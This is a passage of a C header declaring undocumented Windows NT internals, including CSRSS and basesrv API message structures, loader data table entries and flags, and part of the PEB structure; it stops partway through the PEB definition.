#define CONSRV_SERVERDLL_INDEX          2
#define CONSRV_FIRST_API_NUMBER         512

#define USERSRV_SERVERDLL_INDEX         3
#define USERSRV_FIRST_API_NUMBER        1024

#define CSR_MAKE_API_NUMBER( DllIndex, ApiIndex ) \
	(CSR_API_NUMBER)(((DllIndex) << 16) | (ApiIndex))

#define CSR_APINUMBER_TO_SERVERDLLINDEX( ApiNumber ) \
	((ULONG)((ULONG)(ApiNumber) >> 16))

#define CSR_APINUMBER_TO_APITABLEINDEX( ApiNumber ) \
	((ULONG)((USHORT)(ApiNumber)))
	
typedef struct _CSR_NT_SESSION
{
	struct _LIST_ENTRY SessionLink;
	ULONG SessionId;
	ULONG ReferenceCount;
	STRING RootDirectory;
} CSR_NT_SESSION, *PCSR_NT_SESSION;

typedef struct _CSR_API_MSG
{
	PORT_MESSAGE h;
	union
	{
		CSR_API_CONNECTINFO ConnectionRequest;
		struct
		{
			PCSR_CAPTURE_HEADER CaptureBuffer;
			CSR_API_NUMBER ApiNumber;
			ULONG ReturnValue;
			ULONG Reserved;
			union
			{
				CSR_CLIENTCONNECT_MSG ClientConnect;
				ULONG_PTR ApiMessageData[ 46 ];
			} u;
		};
	};
} CSR_API_MSG, *PCSR_API_MSG;

typedef
ULONG (*PCSR_CALLBACK_ROUTINE)(
	IN OUT PCSR_API_MSG ReplyMsg
	);

typedef struct _CSR_CALLBACK_INFO
{
	ULONG ApiNumberBase;
	ULONG MaxApiNumber;
	PCSR_CALLBACK_ROUTINE *CallbackDispatchTable;
} CSR_CALLBACK_INFO, *PCSR_CALLBACK_INFO;

// end csrss


//
// Time Zone
//

typedef struct _RTL_DYNAMIC_TIME_ZONE_INFORMATION {
	struct _RTL_TIME_ZONE_INFORMATION tzi;
	WCHAR TimeZoneKeyName[ 128 ];
	UCHAR DynamicDaylightTimeDisabled;
} RTL_DYNAMIC_TIME_ZONE_INFORMATION, *PRTL_DYNAMIC_TIME_ZONE_INFORMATION;	// <size 0x1b0>

//
// basesrv api
//

typedef struct _BASESRV_API_CONNECTINFO
{
	ULONG ExpectedVersion;
	HANDLE DefaultObjectDirectory;
	ULONG WindowsVersion;
	ULONG CurrentVersion;
	ULONG DebugFlags;
	WCHAR WindowsDirectory[ MAX_PATH ];
	WCHAR WindowsSystemDirectory[ MAX_PATH ];
} BASESRV_API_CONNECTINFO, *PBASESRV_API_CONNECTINFO;

typedef enum _BASESRV_API_NUMBER {
	BasepCreateProcess = BASESRV_FIRST_API_NUMBER,
	BasepCreateThread,
	BasepGetTempFile,
	BasepExitProcess,
	BasepDebugProcess,
	BasepCheckVDM,
	BasepUpdateVDMEntry,
	BasepGetNextVDMCommand,
	BasepExitVDM,
	BasepIsFirstVDM,
	BasepGetVDMExitCode,
	BasepSetReenterCount,
	BasepSetProcessShutdownParam,
	BasepGetProcessShutdownParam,
	BasepSetVDMCurDirs,
	BasepGetVDMCurDirs,
	BasepBatNotification,
	BasepRegisterWowExec,
	BasepSoundSentryNotification,
	BasepRefreshIniFileMapping,
	BasepDefineDosDevice,
	BasepSetTermsrvAppInstallMode,
	BasepSetTermsrvClientTimeZone,
	BasepSxsCreateActivationContext,
	BasepDebugProcessStop,
	BasepRegisterThread,
	BasepDeferredCreateProcess,
	BasepNlsGetUserInfo,
	BasepNlsSetUserInfo,
	BasepNlsUpdateCacheCount,
	BasepMaxApiNumber
} BASESRV_API_NUMBER, *PBASESRV_API_NUMBER;

typedef struct _BASE_NLS_SET_USER_INFO_MSG
{
	ULONG LCType;
	USHORT* pData;
	ULONG DataLength;
} BASE_NLS_SET_USER_INFO_MSG, *PBASE_NLS_SET_USER_INFO_MSG;

typedef struct _BASE_NLS_GET_USER_INFO_MSG
{
	struct _NLS_USER_INFO* pData;
	ULONG DataLength;
} BASE_NLS_GET_USER_INFO_MSG, *PBASE_NLS_GET_USER_INFO_MSG;

typedef struct _BASE_NLS_UPDATE_CACHE_COUNT_MSG
{
	ULONG Reserved;
} BASE_NLS_UPDATE_CACHE_COUNT_MSG, *PBASE_NLS_UPDATE_CACHE_COUNT_MSG;

typedef struct _BASE_UPDATE_VDM_ENTRY_MSG
{
	ULONG iTask;
	ULONG BinaryType;
	PVOID ConsoleHandle;
	PVOID VDMProcessHandle;
	PVOID WaitObjectForParent;
	USHORT EntryIndex;
	USHORT VDMCreationState;
} BASE_UPDATE_VDM_ENTRY_MSG, *PBASE_UPDATE_VDM_ENTRY_MSG;

typedef struct _BASE_GET_NEXT_VDM_COMMAND_MSG
{
	ULONG iTask;
	PVOID ConsoleHandle;
	PVOID WaitObjectForVDM;
	PVOID StdIn;
	PVOID StdOut;
	PVOID StdErr;
	ULONG CodePage;
	ULONG dwCreationFlags;
	ULONG ExitCode;
	PCHAR CmdLine;
	PCHAR AppName;
	PCHAR PifFile;
	PCHAR CurDirectory;
	PCHAR Env;
	ULONG EnvLen;
	struct _STARTUPINFOA* StartupInfo;
	PCHAR Desktop;
	ULONG DesktopLen;
	PCHAR Title;
	ULONG TitleLen;
	PCHAR Reserved;
	ULONG ReservedLen;
	USHORT CurrentDrive;
	USHORT CmdLen;
	USHORT AppLen;
	USHORT PifLen;
	USHORT CurDirectoryLen;
	USHORT VDMState;
	UCHAR fComingFromBat;
} BASE_GET_NEXT_VDM_COMMAND_MSG, *PBASE_GET_NEXT_VDM_COMMAND_MSG;

typedef struct _BASE_SHUTDOWNPARAM_MSG
{
	ULONG ShutdownLevel;
	ULONG ShutdownFlags;
} BASE_SHUTDOWNPARAM_MSG, *PBASE_SHUTDOWNPARAM_MSG;

typedef struct _BASE_GETTEMPFILE_MSG
{
	ULONG uUnique;
} BASE_GETTEMPFILE_MSG, *PBASE_GETTEMPFILE_MSG;

typedef struct _BASE_DEBUGPROCESS_MSG
{
	ULONG dwProcessId;
	CLIENT_ID DebuggerClientId;
	PVOID AttachCompleteRoutine;
} BASE_DEBUGPROCESS_MSG, *PBASE_DEBUGPROCESS_MSG;	// <size 0x10>

typedef struct _BASE_CHECKVDM_MSG
{
	ULONG  iTask;
	HANDLE ConsoleHandle;
	ULONG  BinaryType;
	HANDLE WaitObjectForParent;
	HANDLE StdIn;
	HANDLE StdOut;
	HANDLE StdErr;
	ULONG  CodePage;
	ULONG  dwCreationFlags;
	PCHAR  CmdLine;
	PCHAR  AppName;
	PCHAR  PifFile;
	PCHAR  CurDirectory;
	PCHAR  Env;
	ULONG  EnvLen;
	LPSTARTUPINFOA StartupInfo;
	PCHAR  Desktop;
	ULONG  DesktopLen;
	PCHAR  Title;
	ULONG  TitleLen;
	PCHAR  Reserved;
	ULONG  ReservedLen;
	USHORT CmdLen;
	USHORT AppLen;
	USHORT PifLen;
	USHORT CurDirectoryLen;
	USHORT CurDrive;
	USHORT VDMState;
	struct _LUID* UserLuid;
} BASE_CHECKVDM_MSG, *PBASE_CHECKVDM_MSG;

typedef struct _BASE_GET_VDM_EXIT_CODE_MSG
{
	PVOID ConsoleHandle;
	PVOID hParent;
	ULONG ExitCode;
} BASE_GET_VDM_EXIT_CODE_MSG, *PBASE_GET_VDM_EXIT_CODE_MSG;	// <size 0xc>

typedef struct _BASE_DEFERREDCREATEPROCESS_MSG
{
	struct _CLIENT_ID* ClientId;
	ULONG NtUserFlags;
} BASE_DEFERREDCREATEPROCESS_MSG, *PBASE_DEFERREDCREATEPROCESS_MSG;	// <size 0x8>

typedef struct _BASE_EXITPROCESS_MSG {
	NTSTATUS uExitCode;
} BASE_EXITPROCESS_MSG, *PBASE_EXITPROCESS_MSG;	// <size 0x4>

typedef struct _BASE_GET_SET_VDM_CUR_DIRS_MSG
{
	PVOID ConsoleHandle;
	PCHAR lpszzCurDirs;
	ULONG cchCurDirs;
} BASE_GET_SET_VDM_CUR_DIRS_MSG, *PBASE_GET_SET_VDM_CUR_DIRS_MSG;	// <size 0xc>

typedef struct _BASE_SET_REENTER_COUNT
{
	PVOID ConsoleHandle;
	ULONG fIncDec;
} BASE_SET_REENTER_COUNT, *PBASE_SET_REENTER_COUNT;	// <size 0x8>

#if !defined(_WINNT_) || (defined(_MSC_VER) && (_MSC_VER >= 1300))
typedef enum
{
    ACTCTX_RUN_LEVEL_UNSPECIFIED = 0,
    ACTCTX_RUN_LEVEL_AS_INVOKER,
    ACTCTX_RUN_LEVEL_HIGHEST_AVAILABLE,
    ACTCTX_RUN_LEVEL_REQUIRE_ADMIN,
    ACTCTX_RUN_LEVEL_NUMBERS
} ACTCTX_REQUESTED_RUN_LEVEL;

typedef struct _ACTIVATION_CONTEXT_RUN_LEVEL_INFORMATION {
    DWORD ulFlags;
    ACTCTX_REQUESTED_RUN_LEVEL  RunLevel;
    DWORD UiAccess;
} ACTIVATION_CONTEXT_RUN_LEVEL_INFORMATION, * PACTIVATION_CONTEXT_RUN_LEVEL_INFORMATION;

typedef const struct _ACTIVATION_CONTEXT_RUN_LEVEL_INFORMATION * PCACTIVATION_CONTEXT_RUN_LEVEL_INFORMATION;


#endif

typedef struct _BASE_SXS_CREATEPROCESS_MSG
{
	ULONG Flags;
	ULONG ProcessParameterFlags;
	union
	{
		UNICODE_STRING CultureFallbacks;
		ACTIVATION_CONTEXT_RUN_LEVEL_INFORMATION RunLevel;
		UNICODE_STRING AssemblyName;
	} u;
} BASE_SXS_CREATEPROCESS_MSG, *PBASE_SXS_CREATEPROCESS_MSG;	// <size 0x80>


typedef struct _BASE_CREATEPROCESS_MSG
{
	PVOID ProcessHandle;
	PVOID ThreadHandle;
	CLIENT_ID ClientId;
	ULONG CreationFlags;
	ULONG VdmBinaryType;
	ULONG VdmTask;
	PVOID hVDM;
	struct _BASE_SXS_CREATEPROCESS_MSG Sxs;
	ULONGLONG PebAddressNative;
	ULONG PebAddressWow64;
	USHORT ProcessorArchitecture;
} BASE_CREATEPROCESS_MSG, *PBASE_CREATEPROCESS_MSG;	// <size 0xb0>


typedef struct _BASE_CREATETHREAD_MSG
{
	PVOID ThreadHandle;
	CLIENT_ID ClientId;
} BASE_CREATETHREAD_MSG, *PBASE_CREATETHREAD_MSG;	// <size 0xc>


typedef struct _BASE_MSG_SXS_HANDLES
{
	PVOID File;
	PVOID Process;
	PVOID Section;
	ULONGLONG ViewBase;
} BASE_MSG_SXS_HANDLES, *PBASE_MSG_SXS_HANDLES;	// <size 0x18>


typedef struct _BASE_EXIT_VDM_MSG
{
	PVOID ConsoleHandle;
	ULONG iWowTask;
	PVOID WaitObjectForVDM;
} BASE_EXIT_VDM_MSG, *PBASE_EXIT_VDM_MSG;	// <size 0xc>


typedef struct _BASE_IS_FIRST_VDM_MSG
{
	__int32 FirstVDM;
} BASE_IS_FIRST_VDM_MSG, *PBASE_IS_FIRST_VDM_MSG;	// <size 0x4>


typedef struct _BASE_SET_REENTER_COUNT_MSG
{
	PVOID ConsoleHandle;
	ULONG fIncDec;
} BASE_SET_REENTER_COUNT_MSG, *PBASE_SET_REENTER_COUNT_MSG;	// <size 0x8>


typedef struct _BASE_BAT_NOTIFICATION_MSG
{
	PVOID ConsoleHandle;
	ULONG fBeginEnd;
} BASE_BAT_NOTIFICATION_MSG, *PBASE_BAT_NOTIFICATION_MSG;	// <size 0x8>


typedef struct _BASE_REGISTER_WOWEXEC_MSG
{
	PVOID hEventWowExec;
	PVOID ConsoleHandle;
} BASE_REGISTER_WOWEXEC_MSG, *PBASE_REGISTER_WOWEXEC_MSG;	// <size 0x8>


typedef struct _BASE_REFRESHINIFILEMAPPING_MSG
{
	UNICODE_STRING IniFileName;
} BASE_REFRESHINIFILEMAPPING_MSG, *PBASE_REFRESHINIFILEMAPPING_MSG;	// <size 0x8>


typedef struct _BASE_SET_TERMSRVCLIENTTIMEZONE
{
	struct _RTL_DYNAMIC_TIME_ZONE_INFORMATION* pDTZInfo;
	ULONG ulDTZInfoSize;
	KSYSTEM_TIME RealBias;
	ULONG TimeZoneId;
} BASE_SET_TERMSRVCLIENTTIMEZONE, *PBASE_SET_TERMSRVCLIENTTIMEZONE;	// <size 0x18>

typedef struct _BASE_SET_TERMSRVAPPINSTALLMODE
{
	__int32 bState;
} BASE_SET_TERMSRVAPPINSTALLMODE, *PBASE_SET_TERMSRVAPPINSTALLMODE;


typedef struct _BASE_SOUNDSENTRY_NOTIFICATION_MSG
{
	ULONG VideoMode;
} BASE_SOUNDSENTRY_NOTIFICATION_MSG, *PBASE_SOUNDSENTRY_NOTIFICATION_MSG;	// <size 0x4>


typedef struct _BASE_DEFINEDOSDEVICE_MSG
{
	ULONG Flags;
	UNICODE_STRING DeviceName;
	UNICODE_STRING TargetPath;
} BASE_DEFINEDOSDEVICE_MSG, *PBASE_DEFINEDOSDEVICE_MSG;	// <size 0x14>

typedef struct _BASE_MSG_SXS_STREAM
{
	UCHAR FileType;
	UCHAR PathType;
	UCHAR HandleType;
	UNICODE_STRING Path;
	PVOID FileHandle;
	HANDLE Handle;
	unsigned __int64 Offset;
	ULONG Size;
} BASE_MSG_SXS_STREAM, *PBASE_MSG_SXS_STREAM;	// <size 0x28>


typedef struct _BASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG
{
	ULONG Flags;
	USHORT ProcessorArchitecture;
	UNICODE_STRING CultureFallbacks;
	struct _BASE_MSG_SXS_STREAM Manifest;
	struct _BASE_MSG_SXS_STREAM Policy;
	UNICODE_STRING AssemblyDirectory;
	UNICODE_STRING TextualAssemblyIdentity;
	unsigned __int64 FileTime;
	ULONG ResourceName;
	PVOID ActivationContextData;
	struct _ACTIVATION_CONTEXT_RUN_LEVEL_INFORMATION RunLevel;
	UNICODE_STRING AssemblyName;
} BASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG, *PBASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG;	// <size 0x98>



typedef struct _BASE_API_MSG
{
	PORT_MESSAGE h;
	struct _CSR_CAPTURE_HEADER* CaptureBuffer;
	CSR_API_NUMBER ApiNumber;
	ULONG ReturnValue;
	ULONG Reserved;
	union
	{ /* size 0xb0*/
		BASE_NLS_SET_USER_INFO_MSG NlsSetUserInfo;
		BASE_NLS_GET_USER_INFO_MSG NlsGetUserInfo;
		BASE_NLS_UPDATE_CACHE_COUNT_MSG NlsCacheUpdateCount;
		BASE_SHUTDOWNPARAM_MSG ShutdownParam;
		BASE_CREATEPROCESS_MSG CreateProcess;
		BASE_DEFERREDCREATEPROCESS_MSG DeferredCreateProcess;
		BASE_CREATETHREAD_MSG CreateThread;
		BASE_GETTEMPFILE_MSG GetTempFile;
		BASE_EXITPROCESS_MSG ExitProcess;
		BASE_DEBUGPROCESS_MSG DebugProcess;
		BASE_CHECKVDM_MSG CheckVDM;
		BASE_UPDATE_VDM_ENTRY_MSG UpdateVDMEntry;
		BASE_GET_NEXT_VDM_COMMAND_MSG GetNextVDMCommand;
		BASE_EXIT_VDM_MSG ExitVDM;
		BASE_IS_FIRST_VDM_MSG IsFirstVDM;
		BASE_GET_VDM_EXIT_CODE_MSG GetVDMExitCode;
		BASE_SET_REENTER_COUNT SetReenterCount;
		BASE_GET_SET_VDM_CUR_DIRS_MSG GetSetVDMCurDirs;
		BASE_BAT_NOTIFICATION_MSG BatNotification;
		BASE_REGISTER_WOWEXEC_MSG RegisterWowExec;
		BASE_SOUNDSENTRY_NOTIFICATION_MSG SoundSentryNotification;
		BASE_REFRESHINIFILEMAPPING_MSG RefreshIniFileMapping;
		BASE_DEFINEDOSDEVICE_MSG DefineDosDeviceApi;
		BASE_SET_TERMSRVAPPINSTALLMODE SetTermsrvAppInstallMode;
		BASE_SET_TERMSRVCLIENTTIMEZONE SetTermsrvClientTimeZone;
		BASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG SxsCreateActivationContext;
	} u;
} BASE_API_MSG, *PBASE_API_MSG;	// <size 0xd8>

typedef struct _BASE_STATIC_SERVER_DATA
{
	UNICODE_STRING WindowsDirectory;
	UNICODE_STRING WindowsSystemDirectory;
	UNICODE_STRING NamedObjectDirectory;
	USHORT WindowsMajorVersion;
	USHORT WindowsMinorVersion;
	USHORT BuildNumber;
	USHORT CSDNumber;
	USHORT RCNumber;
	WCHAR CSDVersion[128];
	SYSTEM_BASIC_INFORMATION SysInfo;
	SYSTEM_TIMEOFDAY_INFORMATION TimeOfDay;
	struct _INIFILE_MAPPING* IniFileMapping;
	NLS_USER_INFO NlsUserInfo;
	UCHAR DefaultSeparateVDM;
	UCHAR IsWowTaskReady;
	UNICODE_STRING WindowsSys32x86Directory;
	UCHAR fTermsrvAppInstallMode;
	RTL_DYNAMIC_TIME_ZONE_INFORMATION tziTermsrvClientTimeZone;
	KSYSTEM_TIME ktTermsrvClientBias;
	ULONG TermsrvClientTimeZoneId;
	UCHAR LUIDDeviceMapsEnabled;
	ULONG TermsrvClientTimeZoneChangeNum;
} BASE_STATIC_SERVER_DATA, *PBASE_STATIC_SERVER_DATA;	// <size 0x1860>

#define GDI_BATCH_BUFFER_SIZE 310

typedef struct _GDI_TEB_BATCH {
	ULONG	Offset;
	UCHAR	Alignment[4];
	ULONG_PTR HDC;
	ULONG	Buffer[GDI_BATCH_BUFFER_SIZE];
} GDI_TEB_BATCH,*PGDI_TEB_BATCH;

typedef enum _EVENT_TYPE {
	NotificationEvent,
	SynchronizationEvent
} EVENT_TYPE;

typedef enum _TIMER_TYPE {
	NotificationTimer,
	SynchronizationTimer
} TIMER_TYPE;

typedef enum _WAIT_TYPE {
	WaitAll,
	WaitAny
} WAIT_TYPE;

#define STATIC_UNICODE_BUFFER_LENGTH 261
#define WIN32_CLIENT_INFO_LENGTH 62

#define WIN32_CLIENT_INFO_SPIN_COUNT 1

typedef PVOID* PPVOID;

#define TLS_MINIMUM_AVAILABLE 64

typedef struct _ASSEMBLY_STORAGE_MAP_ENTRY {

	ULONG Flags;
	UNICODE_STRING DosPath;
	PVOID Handle;
} ASSEMBLY_STORAGE_MAP_ENTRY, *PASSEMBLY_STORAGE_MAP_ENTRY;

typedef struct _ASSEMBLY_STORAGE_MAP {

	ULONG Flags;
	ULONG AssemblyCount;
	struct _ASSEMBLY_STORAGE_MAP_ENTRY** AssemblyArray;
} ASSEMBLY_STORAGE_MAP, *PASSEMBLY_STORAGE_MAP;

typedef struct _ACTIVATION_CONTEXT_DATA {
	ULONG Magic;
	ULONG HeaderSize;
	ULONG FormatVersion;
	ULONG TotalSize;
	ULONG DefaultTocOffset;
	ULONG ExtendedTocOffset;
	ULONG AssemblyRosterOffset;
	ULONG Flags;
} ACTIVATION_CONTEXT_DATA, *PACTIVATION_CONTEXT_DATA;

typedef struct _ACTIVATION_CONTEXT {

	LONG RefCount;
	ULONG Flags;
	LIST_ENTRY Links;
	struct _ACTIVATION_CONTEXT_DATA* ActivationContextData;
	//void (NotificationRoutine)(unsigned long, struct _ACTIVATION_CONTEXT*, void*, void*, void*, unsigned char*);
	struct _ACTIVATION_CONTEXT* NotificationRoutine;
	PVOID NotificationContext;
	ULONG SentNotifications[8];
	ULONG DisabledNotifications[8];
	struct _ASSEMBLY_STORAGE_MAP StorageMap;
	struct _ASSEMBLY_STORAGE_MAP_ENTRY* InlineStorageMapEntries[32];
	ULONG StackTraceIndex;
	PVOID StackTraces[4][4];
} ACTIVATION_CONTEXT, *PACTIVATION_CONTEXT;	// <size 0x12c>

typedef struct _PEB_FREE_BLOCK {
	struct _PEB_FREE_BLOCK *Next;
	ULONG Size;
} PEB_FREE_BLOCK, *PPEB_FREE_BLOCK;

typedef struct _PEB_LDR_DATA
{
	ULONG Length;
	BOOLEAN Initialized;
	HANDLE SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
	BOOLEAN ShutdownInProgress;
	HANDLE ShutdownThreadId;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _INITIAL_TEB
{
	struct
	{
		PVOID OldStackBase;
		PVOID OldStackLimit;
	} OldInitialTeb;

	PVOID StackBase;
	PVOID StackLimit;
	PVOID StackAllocationBase;

} INITIAL_TEB, *PINITIAL_TEB;

typedef struct _WOW64_PROCESS
{
	PVOID Wow64;
} WOW64_PROCESS, *PWOW64_PROCESS;

//
// Private flags for loader data table entries
//

#define LDRP_STATIC_LINK                0x00000002
#define LDRP_IMAGE_DLL                  0x00000004
#define LDRP_LOAD_IN_PROGRESS           0x00001000
#define LDRP_UNLOAD_IN_PROGRESS         0x00002000
#define LDRP_ENTRY_PROCESSED            0x00004000
#define LDRP_ENTRY_INSERTED             0x00008000
#define LDRP_CURRENT_LOAD               0x00010000
#define LDRP_FAILED_BUILTIN_LOAD        0x00020000
#define LDRP_DONT_CALL_FOR_THREADS      0x00040000
#define LDRP_PROCESS_ATTACH_CALLED      0x00080000
#define LDRP_DEBUG_SYMBOLS_LOADED       0x00100000
#define LDRP_IMAGE_NOT_AT_BASE          0x00200000
#define LDRP_COR_IMAGE                  0x00400000
#define LDRP_COR_OWNS_UNMAP             0x00800000
#define LDRP_SYSTEM_MAPPED              0x01000000
#define LDRP_IMAGE_VERIFYING            0x02000000
#define LDRP_DRIVER_DEPENDENT_DLL       0x04000000
#define LDRP_ENTRY_NATIVE               0x08000000
#define LDRP_REDIRECTED                 0x10000000
#define LDRP_NON_PAGED_DEBUG_INFO       0x20000000
#define LDRP_MM_LOADED                  0x40000000
#define LDRP_COMPAT_DATABASE_PROCESSED  0x80000000

#define LDR_GET_DLL_HANDLE_EX_UNCHANGED_REFCOUNT 0x00000001
#define LDR_GET_DLL_HANDLE_EX_PIN 0x00000002

#define LDR_ADDREF_DLL_PIN 0x00000001

#define LDR_GET_PROCEDURE_ADDRESS_DONT_RECORD_FORWARDER 0x00000001

#define LDR_LOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS 0x00000001
#define LDR_LOCK_LOADER_LOCK_FLAG_TRY_ONLY 0x00000002

#define LDR_LOCK_LOADER_LOCK_DISPOSITION_INVALID 0
#define LDR_LOCK_LOADER_LOCK_DISPOSITION_LOCK_ACQUIRED 1
#define LDR_LOCK_LOADER_LOCK_DISPOSITION_LOCK_NOT_ACQUIRED 2

#define LDR_UNLOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS 0x00000001

#define LDR_DLL_NOTIFICATION_REASON_LOADED 1
#define LDR_DLL_NOTIFICATION_REASON_UNLOADED 2

typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA
{
	ULONG Flags;
	PUNICODE_STRING FullDllName;
	PUNICODE_STRING BaseDllName;
	PVOID DllBase;
	ULONG SizeOfImage;
} LDR_DLL_LOADED_NOTIFICATION_DATA, *PLDR_DLL_LOADED_NOTIFICATION_DATA;

typedef struct _LDR_DLL_UNLOADED_NOTIFICATION_DATA
{
	ULONG Flags;
	PCUNICODE_STRING FullDllName;
	PCUNICODE_STRING BaseDllName;
	PVOID DllBase;
	ULONG SizeOfImage;
} LDR_DLL_UNLOADED_NOTIFICATION_DATA, *PLDR_DLL_UNLOADED_NOTIFICATION_DATA;

typedef union _LDR_DLL_NOTIFICATION_DATA
{
	LDR_DLL_LOADED_NOTIFICATION_DATA Loaded;
	LDR_DLL_UNLOADED_NOTIFICATION_DATA Unloaded;
} LDR_DLL_NOTIFICATION_DATA, *PLDR_DLL_NOTIFICATION_DATA;

typedef VOID (NTAPI *PLDR_DLL_NOTIFICATION_FUNCTION)(
	IN ULONG NotificationReason,
	IN PLDR_DLL_NOTIFICATION_DATA NotificationData,
	IN OPTIONAL PVOID Context
	);

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

typedef struct _RTL_PROCESS_MODULE_INFORMATION_EX
{
	USHORT NextOffset;
	RTL_PROCESS_MODULE_INFORMATION BaseInfo;
	ULONG ImageChecksum;
	ULONG TimeDateStamp;
	PVOID DefaultBase;
} RTL_PROCESS_MODULE_INFORMATION_EX, *PRTL_PROCESS_MODULE_INFORMATION_EX;

//
// Loader Data Table. Used to track DLLs loaded into an
// image.
//
#ifdef __cplusplus
struct LIST_ENTRY_EX : public LIST_ENTRY
{
	BYTE unk1[8];
	HANDLE base;
	BYTE unk2[20];
	WCHAR* name;
};
#endif

typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
    PVOID ContextInformation;
    ULONG_PTR OriginalBase;
    LARGE_INTEGER LoadTime;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef const struct _LDR_DATA_TABLE_ENTRY *PCLDR_DATA_TABLE_ENTRY;

typedef NTSTATUS LDR_RELOCATE_IMAGE_RETURN_TYPE;

struct _FLS_CALLBACK_INFO;

typedef BOOLEAN (NTAPI *PDLL_INIT_ROUTINE)(
	IN PVOID DllHandle,
	IN ULONG Reason,
	IN OPTIONAL PCONTEXT Context
	);

#define DOS_MAX_COMPONENT_LENGTH 255
#define DOS_MAX_PATH_LENGTH (DOS_MAX_COMPONENT_LENGTH + 5)

#define RTL_USER_PROC_CURDIR_CLOSE 0x00000002
#define RTL_USER_PROC_CURDIR_INHERIT 0x00000003

typedef struct _RTL_RELATIVE_NAME
{
	STRING RelativeName;
	HANDLE ContainingDirectory;
} RTL_RELATIVE_NAME, *PRTL_RELATIVE_NAME;

typedef struct _RTLP_CURDIR_REF *PRTLP_CURDIR_REF;

typedef struct _RTL_RELATIVE_NAME_U
{
	UNICODE_STRING RelativeName;
	HANDLE ContainingDirectory;
	PRTLP_CURDIR_REF CurDirRef;
} RTL_RELATIVE_NAME_U, *PRTL_RELATIVE_NAME_U;

typedef enum _RTL_PATH_TYPE
{
	RtlPathTypeUnknown,
	RtlPathTypeUncAbsolute,
	RtlPathTypeDriveAbsolute,
	RtlPathTypeDriveRelative,
	RtlPathTypeRooted,
	RtlPathTypeRelative,
	RtlPathTypeLocalDevice,
	RtlPathTypeRootLocalDevice
} RTL_PATH_TYPE, *PRTL_PATH_TYPE;

#define RTL_MAX_DRIVE_LETTERS 32
#define RTL_DRIVE_LETTER_VALID (USHORT)0x0001

// 18/04/2011 updated
typedef struct _PEB
{
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsLegacyProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN SpareBits : 3;
        };
    };
    HANDLE Mutant;

    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    union
    {
        ULONG CrossProcessFlags;
        struct
        {
            ULONG ProcessInJob : 1;
            ULONG ProcessInitializing : 1;
            ULONG ProcessUsingVEH : 1;
            ULONG ProcessUsingVCH : 1;
            ULONG ProcessUsingFTH : 1;
            ULONG ReservedBits0 : 27;
        };
        ULONG EnvironmentUpdateCount;
    };
    union
    {
        PVOID KernelCallbackTable;
        PVOID UserSharedInfoPtr;
    };
    ULONG SystemReserved[1];
    ULONG AtlThunkSListPtr32;
    PVOID ApiSetMap;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[2];
    PVOID ReadOnlySharedMemoryBase;
    PVOID HotpatchInformation;
    PPVOID ReadOnlyStaticServerData;
    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;

    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;

    LARGE_INTEGER CriticalSectionTimeout;
    SIZE_T HeapSegmentReserve;
    SIZE_T HeapSegmentCommit;
    SIZE_T HeapDeCommitTotalFreeThreshold;
    SIZE_T HeapDeCommitFreeBlockThreshold;

    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PPVOID ProcessHeaps;

    PVOID GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    ULONG GdiDCAttributeList;

    PRTL_CRITICAL_SECTION LoaderLock;

    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSCSDVersion;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    ULONG_PTR ImageProcessAffinityMask;
    GDI_HANDLE_BUFFER GdiHandleBuffer;
    PVOID PostProcessInitRoutine;

